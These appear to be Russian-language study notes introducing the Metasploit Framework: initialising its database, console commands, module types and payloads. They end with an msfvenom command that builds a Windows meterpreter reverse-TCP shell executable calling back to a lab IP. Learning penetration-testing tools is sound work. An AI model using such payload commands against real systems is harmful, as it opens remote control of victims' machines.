# Средства эксплуатации

## Возможности Metasploit Freamwork

Metasploit Freamwork — на данный момент самый популярный и функциональный инструмент для тестирование на проникновение. Содержит множество модулей для проверки на уязвимости, большую базу эксплоитов.

Инциализация БД:
```bash
sudo msfdb init
```
Переход в Metasploit:
```
msfconsole
```

Команды описаны в pdf.

## Базовые команды

Отвечают за настройку пользовательского окружения, изменение глобальных и локальных контекстно-зависимых переменных, настройку рабочего пространства и управления сессиями.

* set — устанавливает значение контекстно-заивисмых переменных, таких как: ip адрес локально удаленого хоста, номер локального удлаеного порта и номер сессии. Для установки глобального значения для всех модулей можно использовать `setg`.
* sessions — отвечает за отображение информации об открытых сессиях, сессия — установленная связь между хостом жертвы и атакующей машиной.

## Модульные команды

Отвечают за нстройку и управление модулями, они конфигурируют эксплоиты, полезную нагрузку, вспомонательные модули.

* search — поиск модулей
* use — используется для взаимодействия с конкретным модулей

Большинство модулей написано на ruby и доступно в _/usr/share/metasploit_framework/modules_. Другие модули можно подгрузить командой `loadpath <path>`

После выбора модуля можно посмотреть его опции для этого есть команды:
* show options — показывает основные опции, необходимые для работы модуля
* show advanced — показывает дополнильные опции
Команды можно совместить, тогда будут отображены все опции.

Комада `run` запускает модуль.

## Строение и компоненты фреймворка

Основные типы модулей:
* Вспомогательные — содержит средства анализа угроз, сетевые сканеры, средства атак грубой силы.
* Экплоит — соднржит базу эксплоитов позволяющих выполнять код на целевой системе.

Полезная нагрузка — прикепляются к эксплоиту, они обеспечивают функционал и предоставляют доступ к целевым системам, т.е. это ключевой компонент, который позволяет управлять целевой системой.

## Эксплуатация уязвимостей

Для экплоитов копмпиляция использется `msfvenom`, например для компиляции экплоита для windows:
```bash
msfvenom -a x64 --platform windows -f exe -p windows/x64/meterpreter/reverse_tcp lhost=10.0.2.15 -o shell.exe
```
